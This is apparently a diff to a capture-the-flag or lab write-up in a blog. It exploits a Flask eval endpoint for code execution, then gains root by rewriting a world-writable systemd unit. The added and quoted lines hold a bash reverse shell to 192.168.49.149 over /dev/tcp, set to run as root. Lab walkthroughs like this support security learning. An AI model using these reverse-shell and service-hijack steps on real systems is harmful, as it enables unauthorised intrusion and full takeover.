@@ -80,7 +80,7 @@ curl -X POST 'http://192.168.149.117:50000/verify' --data "code=49*54"
 # 2646
 ```
 
-`49*54` returning `2646` is the tell — arbitrary Python execution. Import `subprocess` and spawn a bash reverse shell, URL-encoding the payload (`+` → space, `%26` → `&`):
+`49*54` returning `2646` is the tell — arbitrary Python execution. Import `subprocess` and spawn a bash reverse shell; single-quote the whole `--data` value so your local shell leaves the `>&` and `0>&1` redirections intact:
 
 ```bash
 curl -X POST 'http://192.168.149.117:50000/verify' \
@@ -123,6 +123,25 @@ WantedBy=multi-user.target
 The catch: this shell is unstable — no `vi`, no SSH, and a broken unit means the Python server never comes back and you're stuck reverting. So write the file non-interactively. Push a small script that echoes the unit to stdout, redirect it into place, arm a listener, and reboot:
 
 ```bash
+# svc.sh just prints the unit above to stdout
+cat > svc.sh <<'EOF'
+#!/bin/bash
+cat <<'UNIT'
+[Unit]
+Description=Python App
+After=network-online.target
+
+[Service]
+Type=simple
+ExecStart=bash -c 'bash -i >& /dev/tcp/192.168.49.149/80 0>&1'
+User=root
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+UNIT
+EOF
+
 chmod +x svc.sh
 ./svc.sh > /etc/systemd/system/pythonapp.service
 sudo reboot -f
@@ -142,7 +161,7 @@ When the box comes back, systemd starts the tampered service as root and the rev
 
 {{< callout type="note" >}}
 - Debug/eval endpoints on Werkzeug/Flask dev servers (`/console`, `/verify`) are RCE by design — probe any parameter that echoes a *computed* result (`49*54` → `2646` proves `eval`).
-- URL-encode reverse-shell payloads carefully when they ride through a query/body param — `&` becomes `%26`, spaces become `+`.
+- Single-quote reverse-shell payloads that ride through a `--data` body so your local shell doesn't eat the `>&`, `&`, and `0>&1` before curl ever sends them.
 - A world-writable systemd unit is game over: rewrite `ExecStart` with `User=root` and force a restart. Here the NOPASSWD `reboot` right was the trigger that fired it.
 - On an unstable shell with no editor, build config files non-interactively (echo/printf into the target). One typo in a service unit and your only move is a box revert.
 {{< /callout >}}
